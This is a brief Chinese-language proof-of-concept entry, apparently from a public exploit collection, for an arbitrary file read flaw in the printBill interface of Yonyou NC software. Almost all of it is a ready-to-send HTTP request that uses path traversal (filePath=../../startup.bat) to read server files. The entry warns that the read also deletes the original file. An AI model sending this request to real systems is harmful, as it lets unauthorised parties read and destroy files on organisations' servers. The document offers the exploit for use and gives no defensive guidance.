## 用友NC系统printBill接口存在任意文件读取漏洞

`注意：这个漏洞在读取文件的时候，会将原来的文件删除，谨慎使用。`

## poc
```
GET /portal/pt/printpdf/printBill?pageId=login&filePath=../../startup.bat HTTP/1.1
Host: 192.168.63.129:8088
User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

```

![image](https://github.com/wy876/POC/assets/139549762/af404736-3588-4d7c-a76e-d781fb1d1251)


